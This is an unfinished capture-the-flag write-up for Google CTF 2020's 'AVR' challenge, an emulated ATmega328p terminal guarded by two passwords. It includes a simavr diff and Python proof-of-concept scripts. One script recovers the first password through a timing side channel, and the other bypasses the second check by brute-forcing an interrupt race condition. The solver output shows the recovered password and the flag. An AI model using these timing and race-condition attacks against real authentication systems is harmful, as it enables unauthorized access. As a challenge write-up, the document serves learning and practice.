# AVR

**Problem Description:**

> We found this old terminal with access to some top secret data, but it's secured by passwords. Can you break in anyway?<br>
>
> [Attachment](./8bfc40e205d0793678e76f2610fc0a9f58159fcdcbbf3424b0538b0b019bfd50c0ddffcaeca391379f260390c90b1e4d5633acb2c334bd5f5663c4072354bb13)<br>
>
> `avr.2020.ctfcompetition.com 1337`

## Solution

As usual, I unzipped the attachment. There were a few files:

- [Makefile](./Makefile)
- [simavr_diff](./simavr_diff)
- [code.c](./code.c)
- [simduino.elf](./simduino.elf)
- [code.hex](./code.hex)

I started by taking a quick peek at `simavr_diff`:

```diff
diff --git a/examples/board_simduino/simduino.c b/examples/board_simduino/simduino.c
index 007b383..7f4fc30 100644
--- a/examples/board_simduino/simduino.c
+++ b/examples/board_simduino/simduino.c
@@ -98,7 +98,7 @@ int main(int argc, char *argv[])
 	char boot_path[1024] = "ATmegaBOOT_168_atmega328.ihex";
 	uint32_t boot_base, boot_size;
 	char * mmcu = "atmega328p";
-	uint32_t freq = 16000000;
+	uint32_t freq = 1000000;
 	int debug = 0;
 	int verbose = 0;
 
<snipped some changes, they mostly replaced loops over file descriptors to just deal with stdin/out or something>
 
--- a/examples/parts/uart_pty.h
+++ b/examples/parts/uart_pty.h
@@ -33,7 +33,7 @@ enum {
 	IRQ_UART_PTY_COUNT
 };
 
-DECLARE_FIFO(uint8_t,uart_pty_fifo, 512);
+DECLARE_FIFO(uint8_t,uart_pty_fifo, 65536);
 
 typedef struct uart_pty_port_t {
 	unsigned int	tap : 1, crlf : 1;
```

Which led me to conclude:

1. We are dealing with the `atmega328p` microcontroller.
2. The clock speed was reduced from 16Mhz to 1Mhz.
3. The `uart_pty_fifo` buffer size was changed from 512 bytes to 65536 bytes.

Then, I moved onto `code.c`

## TODO

- Talk about `code.c`

- Talk about how the first password check screamed, "Timing attack me!"

  - Clock speed reduced
  - Uptime printed
  - `strcmp` for first password vs constant time check for second password

- Talk about blessed determinism, even over network, thanks to simavr and way code was written

- Race condition:

  - Interrupts being queued during `cli()` and executed after `sei()`, if interrupt mask still allows it

  - More specifically, how breadsticks noticed queued interrupts are executed *two* instructions after `sei()`

  - Maybe, also how this doesn't make sense when looking at the [atmega328p datasheet](http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-7810-Automotive-Microcontrollers-ATmega328P_Datasheet.pdf)? Perhaps a `simavr` bug? Or datasheet error?

    > When using the SEI instruction to enable interrupts, the instruction following SEI will be executed before any pending interrupts

  - `TOIE1` not being unset when `timer_on_off(0)`, so `TIMER1_OVF_vect` can still fire after line 171

  - Coincidentally, `logged_in = 1` takes two instructions and is right after `sei()`.

- Explain [Password 1 Crack POC](#password-1-crack-poc), [Password 2 Bypass POC](#password-2-bypass-poc) and [Flag](#flag) better and move them somewhere else

## Password 1 Crack POC

We search for the password, letter by letter, using a timing attack. Thanks to how very deterministic all of this is, to find the next letter:

1. Connect and spam the current password + one more character that will 100% not be in the password (ie. `\x7f`), as many times as there are letters in the alphabet (`gen_baseline_times`)
   1. Note down the time taken for each attempt (difference in uptime)
2. Connect again and then spam current password + letter for each letter in the alphabet
   1. Note down the time taken for each attempt
3. The first letter whose time taken differs from the baseline, must be the next letter of the password

```python
def main():
    password, password_solved = "", False
    print("Finding password...")
    print("Password: ", end="")
    while not password_solved:
        letter, password_solved = timing_attack_next_char(password)
        password += letter
        print(letter, end="" if not password_solved else "\n")

def timing_attack_next_char(curr_password):
    baseline_times = gen_baseline_times(curr_password)
    msg = "\n"
    for c in map(chr, range(0x21, 0x7f)):
        msg += f"agent\n{curr_password}{c}\n"
    io = connect()
    io.send(msg)
    uptime = get_uptime(io)
    char, password_solved = None, False
    for i in range(0x21, 0x7f):
        if b"Access granted" in get_attempt_output(io):
            char, password_solved = chr(i), True
            break
        new_uptime = get_uptime(io)
        # Don't ever ask me why I am using != instead of >.
        if (new_uptime - uptime) != baseline_times[i-0x21]:
            char = chr(i)
            break
        uptime = new_uptime
    io.close()
    return char, password_solved


def gen_baseline_times(curr_password):
    msg = "\n" + f"agent\n{curr_password}\x7f\n" * (0x7f - 0x21)
    io = connect()
    io.send(msg)
    uptime = get_uptime(io)
    times = []
    for _ in range(0x21, 0x7f):
        new_uptime = get_uptime(io)
        times.append(new_uptime - uptime)
        uptime = new_uptime
    io.close()
    return times
```

## Password 2 Bypass POC

Instead of trying to do any meaningful calculations, to work out the timing required to trigger the race condition, we just brute force :stuck_out_tongue:

```python
def main():
    print("Trying to trigger race condition by padding newlines before login...")
    flag, num_pads = "", 0
    while not flag:
        print(".", end="")
        msg = "\n"*(num_pads+1)+f"agent\n{password}\n"
        io = connect()
        io.send(msg)
        if b"on" in get_post_login_timer_status(io):
            print(f"\nRace condition triggered using {num_pads} newlines.")
            flag = get_flag(io).decode()
        io.close()
        num_pads += 1
    print(f"Flag: {flag}")
```

## Flag

```bash
$ python3 solve.py --remote
Finding password...
Password: doNOTl4unch_missi1es!
Trying to trigger race condition by padding newlines before login...
........................................................................................................................................................................................................................................................................
Race condition triggered using 263 padding newlines.
Flag: CTF{1nv1sibl3_sei_r4c3_c0ndi7i0n}
```

